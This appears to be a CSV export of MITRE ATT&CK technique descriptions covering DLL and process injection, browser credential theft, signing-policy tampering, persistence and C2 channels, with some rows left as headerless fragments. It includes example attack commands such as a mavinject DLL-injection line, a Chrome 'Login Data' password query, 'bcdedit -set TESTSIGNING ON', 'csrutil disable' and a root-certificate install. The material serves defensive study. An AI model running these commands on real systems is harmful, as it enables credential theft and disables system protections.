T1218.013,System Binary Proxy Execution: Mavinject,"Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).   [1]      Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e.  Dynamic-link Library Injection ), allowing for arbitrary code execution (ex.  C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL ).   [2]      [3]    Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process.    In addition to  Dynamic-link Library Injection , Mavinject.exe can also be abused to perform import descriptor injection via its   /HMODULE  command-line parameter (ex.  mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER ). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.   [4]",Description
T1090.003,Proxy: Multi-hop Proxy,"To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network.    [1]      In the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.  By leveraging  Patch System Image , adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.  This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.  This method is dependent upon the  Network Boundary Bridging  method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s WAN. Protocols such as ICMP may be used as a transport.",Description

T1555.003,Credentials from Password Stores: Credentials from Web Browsers,"Adversaries may acquire credentials from web browsers by reading files specific to the target browser.   [1]    Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.   For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file,  AppData\Local\Google\Chrome\User Data\Default\Login Data  and executing a SQL query:  SELECT action_url, username_value, password_value FROM logins; . The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function  CryptUnprotectData , which uses the victim’s cached logon credentials as the decryption key.   [2]      Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.   [3]      [4]    Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the  Windows Credential Manager .   Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.   [5]      After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",Description

T1037.004,Boot or Logon Initialization Scripts: RC Scripts,"Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.   Adversaries can establish persistence by adding a malicious binary path or shell commands to  rc.local ,  rc.common , and other RC scripts specific to the Unix-like distribution.   [1]      [2]    Upon reboot, the system executes the script's contents as root, resulting in persistence.   Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.   [3]      Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of  Launchd .    [4]      [5]    This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.

T1553.006,Subvert Trust Controls: Code Signing Policy Modification,"Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system.    Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.   [1]      [2]    Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.   [3]      [2]      Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities,  Modify Registry , rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.   [4]      [2]      [5]      [6]    Examples of commands that can modify the code signing policy of a system include  bcdedit.exe -set TESTSIGNING ON  on Windows and  csrutil disable  on macOS.   [4]      [2]    Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.   [7]      To gain access to kernel memory to modify variables related to signature checks, such as modifying  g_CiOptions  to disable Driver Signature Enforcement, adversaries may conduct  Exploitation for Privilege Escalation  using a signed, but vulnerable driver.

The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.   With authenticated access there are several tools that can be used to find permissions groups. The  Get-MsolRole  PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts    [1]      [2]   .   Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups.

T1585,Establish Accounts,"Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.   [1]      [2]      For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.   [1]      [2]      Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for  Phishing for Information  or  Phishing .

T1598.002,Phishing for Information: Spearphishing Attachment,"Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex:  Establish Accounts  or  Compromise Accounts ) and/or sending multiple, seemingly urgent messages.   All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file.   [1]      [2]    The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex:  Search Open Websites/Domains  or  Search Victim-Owned Websites ) to craft persuasive and believable lures.",Description

T1102.003,Web Service: One-Way Communication,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.   Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",Description

T1547.003,Boot or Logon Autostart Execution: Time Providers,"Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.   [1]    W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.   [2]      Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of   HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\ .   [2]    The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.   [2]      Adversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.   [3]",Description
T1583.002,Acquire Infrastructure: DNS Server,"Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex:  Application Layer Protocol ). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.   By running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic ( DNS ). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.

T1550.001,Use Alternate Authentication Material: Application Access Token,"Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.   Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).   [1]       In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.   [2]      [3]    The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured – for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.   [4]      OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.   [5]      For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a ""refresh"" token enabling background access is awarded.   [6]    With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.   [7]      Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",Description
T1550.001,Use Alternate Authentication Material: Application Access Token,"APT28  has used several malicious applications that abused OAuth access tokens to gain access to target email accounts, including Gmail and Yahoo Mail.   [8]",Procedure Examples

T1596.005,Search Open Technical Databases: Scan Databases,"Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.   [1]      Adversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  Active Scanning  or  Search Open Websites/Domains ), establishing operational resources (ex:  Develop Capabilities  or  Obtain Capabilities ), and/or initial access (ex:  External Remote Services  or  Exploit Public-Facing Application ).",Description
T1011.001,Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth,"Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.   Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",Description

[1]",Procedure Examples
T1584.006,Compromise Infrastructure: Web Services,"Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control ( Web Service ) or  Exfiltration Over Web Service .   [1]    Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them.",Description

T1584.006,Compromise Infrastructure: Web Services,Turla  has frequently used compromised WordPress sites for C2 infrastructure.   [1],Procedure Examples
T1537,Transfer Data to Cloud Account,"Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.   A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.   Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.   [1]",Description
T1553.004,Subvert Trust Controls: Install Root Certificate,"Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.   [1]    Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.   Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.   [2]      Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide  Adversary-in-the-Middle  capability for intercepting information transmitted over secure TLS/SSL communications.   [3]      Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.   [4]      In macOS, the Ay MaMi malware uses  /usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert  to install a malicious certificate as a trusted root certificate into the system keychain.

[1]      Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

T1055.003,Process Injection: Thread Execution Hijacking,"Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.    Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as  OpenThread . At this point the process can be suspended then written to, realigned to the injected code, and resumed via  SuspendThread  ,  VirtualAllocEx ,  WriteProcessMemory ,  SetThreadContext , then  ResumeThread  respectively.   [1]      This is very similar to  Process Hollowing  but targets an existing process rather than creating a process in a suspended state.     Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.",Description

T1608.004,Stage Capabilities: Drive-by Target,"Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in  Drive-by Compromise . In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as  Application Access Token . Prior to  Drive-by Compromise , adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ( Acquire Infrastructure ) or previously compromised ( Compromise Infrastructure ).   Adversaries may upload or inject malicious web content, such as  JavaScript , into websites.   [1]      [2]    This may be done in a number of ways, including inserting malicious script into web pages or other user controllable web content such as forum posts. Adversaries may also craft malicious web advertisements and purchase ad space on a website through legitimate ad providers. In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in  Gather Victim Host Information ) to ensure it is vulnerable prior to attempting exploitation.   [3]      Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.   Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ( Domains ) to help facilitate  Drive-by Compromise .",Description

T1547.015,Boot or Logon Autostart Execution: Login Items,"Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.   [1]    Login items can be added via a shared file list or Service Management Framework.   [2]    Shared file list login items can be set using scripting languages such as  AppleScript , whereas the Service Management Framework uses the API call  SMLoginItemSetEnabled .   Login items installed using the Service Management Framework leverage  launchd , are not visible in the System Preferences, and can only be removed by the application that created them.   [2]      [3]    Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.   [4]    Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.   Adversaries can utilize  AppleScript  and  Native API  calls to create a login item to spawn malicious executables.   [5]    Prior to version 10.5 on macOS, adversaries can add login items by using  AppleScript  to send an Apple events to the ""System Events"" process, which has an AppleScript dictionary for manipulating login items.

Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.   Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.   Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",Description

T1550.002,Use Alternate Authentication Material: Pass the Hash,"Adversaries may ""pass the hash"" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.   When performing PtH, valid password hashes for the account being used are captured using a  Credential Access  technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.   Adversaries may also use stolen password hashes to ""overpass the hash."" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform  Pass the Ticket  attacks.   [1]",Description

During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex:  Application Layer Protocol ). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.   By compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.   [1]      [2]     Additionally, adversaries may leverage such control in conjunction with  Digital Certificates  to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications.

T1221,Template Injection,"Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.   [1]      Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.   Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.   [2]    These documents can be delivered via other techniques such as  Phishing  and/or  Taint Shared Content  and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.   [3]    Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.   [4]      Adversaries may also modify the  *\template  control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.   [5]      [6]      This technique may also enable  Forced Authentication  by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.

Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.   Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",Description

A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.   Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure.

T1055.002,Process Injection: Portable Executable Injection,"Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process.    PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as  VirtualAllocEx  and  WriteProcessMemory , then invoked with  CreateRemoteThread  or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references.    [1]       Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.",Description

T1055.011,Process Injection: Extra Window Memory Injection,"Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process.    Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).   [1]    Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.    [2]       [3]      Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.   Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as  WriteProcessMemory  and  CreateRemoteThread .   [4]    More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.     [5]       [6]      Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.",Description

[5]      [6],Procedure Examples
T1204,User Execution,"An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of  Phishing .   While  User Execution  frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after  Internal Spearphishing .   Adversaries may also deceive users into performing actions such as enabling  Remote Access Software , allowing direct control of the system to the adversary, or downloading and executing malware for  User Execution . For example, tech support scams can be facilitated through  Phishing , vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or  Remote Access Software .

T1059.002,Command and Scripting Interpreter: AppleScript,"Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.   [1]    These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.   Scripts can be run from the command-line via  osascript /path/to/script  or  osascript -e ""script here"" . Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding  #!/usr/bin/osascript  to the start of the script file.   [2]      AppleScripts do not need to call  osascript  to execute. However, they may be executed from within mach-O binaries by using the macOS  Native API s  NSAppleScript  or  OSAScript , both of which execute code independent of the  /usr/bin/osascript  command line utility.   Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute  Native API s, which otherwise would require compilation and execution in a mach-O binary file format.

T1546.015,Event Triggered Execution: Component Object Model Hijacking,"Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.   [1]     References to various COM objects are stored in the Registry.    Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.   [2]    An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",Description

T1200,Hardware Additions,"Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e.  Replication Through Removable Media ), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.   While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e.  Adversary-in-the-Middle ), keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others.   [1]      [2]      [3]      [4]",Description
T1200,Hardware Additions,"DarkVishnya  used Bash Bunny, Raspberry Pi, netbooks or inexpensive laptops to connect to the company’s local network.   [5]",Procedure Examples
T1205,Traffic Signaling,"Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e.  Port Knocking ), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.   Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).   The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r    [1]   , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.   On network devices, adversaries may use crafted packets to enable  Network Device Authentication  for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.   [2]      [3]      [4]     To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage  Patch System Image  due to the monolithic nature of the architecture.   Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.   [5]      [6]",Description

T1053,Scheduled Task or Job,"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.   [1]      Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to  System Binary Proxy Execution , adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.   [2]",Description

T1543.002,Create or Modify System Process: Systemd Service,"Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.   [1]      [2]    Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.   Systemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the  /etc/systemd/system  and  /usr/lib/systemd/system  directories and have the file extension  .service . Each service unit file may contain numerous directives that can execute system commands:   Adversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at system boot.   [3]      While adversaries typically require root privileges to create/modify service unit files in the  /etc/systemd/system  and  /usr/lib/systemd/system  directories, low privilege users can create/modify service unit files in directories such as  ~/.config/systemd/user/  to achieve user-level persistence.

T1564.009,Hide Artifacts: Resource Forking,"Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.   [1]    Usage of a resource fork is identifiable when displaying a file’s extended attributes, using  ls -l@  or  xattr -l  commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the  /Resources  folder.   [2]      [3]      Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.   [4]      [5]",Description

